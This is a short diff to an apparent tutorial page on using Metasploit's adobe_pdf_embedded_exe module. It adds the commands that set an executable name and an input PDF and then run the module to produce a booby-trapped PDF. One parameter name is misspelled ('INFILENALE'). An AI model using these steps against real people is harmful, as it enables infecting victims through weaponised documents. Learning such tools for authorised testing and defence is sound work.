@@ -37,3 +37,7 @@
 * <code> msfconsole </code>
 * <code> use exploit/windows/fileformat/adobe_pdf_embedded_exe </code>
 
+* Now you have to set EXENAME parameter and run 
+* <code> set EXENAME myexefile.exe </code>
+* <code> set INFILENALE mypdffile.pdf </code>
+* <code> run </code>
